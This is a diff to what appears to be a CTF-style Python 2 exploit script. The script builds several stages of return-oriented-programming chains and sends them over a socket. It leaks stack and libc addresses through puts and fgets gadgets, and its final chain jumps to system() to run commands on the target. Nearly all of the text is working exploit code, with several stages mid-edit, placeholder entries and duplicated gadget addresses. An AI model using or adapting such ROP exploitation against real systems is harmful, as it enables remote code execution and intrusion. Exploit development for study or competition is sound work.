@@ -150,9 +150,9 @@ roplist2.append(0x0000000000000000) #
 roplist2.append(0x0000000000000000) #
 roplist2.append(0x0000000000000000) #
 roplist2.append(0x0000000000000000) #
-roplist2.append(0x601250) #
+roplist2.append(0x601250)    		#
 roplist2.append(0x00000000004006d3) # pop rdi; ret 
-roplist2.append(0x601185) #
+roplist2.append(0x601185)           # sets RDX to 601134
 roplist2.append(0x000000000040063a) # <---- loop to puts
 roplist2.append(0x4141414141414141) #
 roplist2.append(0x4141414141414141) #
@@ -201,10 +201,10 @@ roplist3.append(0x0000000000000000) #
 roplist3.append(0x0000000000000000) #
 roplist3.append(0x0000000000000000) #
 roplist3.append(0x0000000000000000) #
-roplist3.append(stack_leak)		    # 
+roplist3.append(0x60115a)		    # 
 roplist3.append(0x00000000004006d3) # pop rdi
 roplist3.append(__libc_start_ptr)   # 
-roplist3.append(0x000000000040063a) #
+roplist3.append(0x000000000040063a) # <---- loop to puts
 
 
 print "[*] Sending ze stage 3 ROP gadgets to get libc start pointer..."
@@ -243,27 +243,44 @@ roplist4.append(0x0000000000000000) #
 roplist4.append(0x0000000000000000) #
 roplist4.append(0x0000000000000000) #
 roplist4.append(0x0000000000000000) #
-roplist4.append(0x5757575757575757) #
-roplist4.append(0x5858585858585858) #
-roplist4.append(0x0000000000400590) # pop rbp ; ret <----ret pointer
-roplist4.append(stack_leak)		    # 
+roplist4.append(0x0000000000000000) #
+roplist4.append(0x60115a) #
+roplist4.append(0x000000000040064e) # mov rdx, stin ; lea rax,[rbp-0x40]
+roplist4.append(0x60111a)		    # 
 roplist4.append(0x000000000040064e) # mov rdx, stin ; lea rax,[rbp-0x40] ; mov esi,0x1f4 ; mov rdi,rax; call fgets
 roplist4.append(stack_leak - 0x40 ) # ret to "pop rdi" instruction on stack on stack
-roplist4.append(0x0000000000000000) #
-roplist4.append(0x0000000000000000) #
+roplist4.append(0x000000000040064e) #
+roplist4.append(0x000000000040064e) #
 ropchain4 = build_bytes(roplist4)
 
-print "[*] Building ze stage 4 ROP gadgets..."
-raw_input("[+] Press enter to continue: ")
 
-sleep(.5)
-
-
-print "[+] Sending third stage."
+print "[+] Sent stage 4 ROP gadgets."
 s.sendall(ropchain4+"\n")
 sleep(.5)
 
+raw_input("[+] Press enter to continue: ")
+
 roplist5 = []
+roplist5.append(0x4141414141414141) #
+
+
+#roplist4.append(0x000000000040064e) #
+ropchain5 = build_bytes(roplist5)
+
+
+print "[+] Sending 5th stage."
+raw_input("[+] Press enter to continue: ")
+s.sendall(ropchain5+"\n")
+sleep(.5)
+
+roplist5 = []
+roplist5.append(0x0000000000000000) #
+roplist5.append(0x0000000000000000) #
+roplist5.append(0x0000000000000000) #
+roplist5.append(0x0000000000000000) #
+roplist5.append(0x0000000000000000) #
+roplist5.append(0x0000000000000000) #
+roplist5.append(0x0000000000000000) # pop rbp ; ret <----ret pointer
 roplist5.append(0x00000000004006d3) # 0x40 (pop rdi; ret )
 roplist5.append(stack_leak + 0x50 ) # 0x38
 roplist5.append(0x0000000000400590) # 0x28 (pop rbp ; ret )
@@ -273,7 +290,7 @@ roplist5.append(system)				# 0x18
 #roplist4.append(0x000000000040064e) #
 ropchain5 = build_bytes(roplist5)
 
-print "[+] Sending ze stage 4 ROP gadgets and jumping to system."
+
 raw_input("[+] Press enter to continue: ")
 
 s.sendall(ropchain5+"\n")
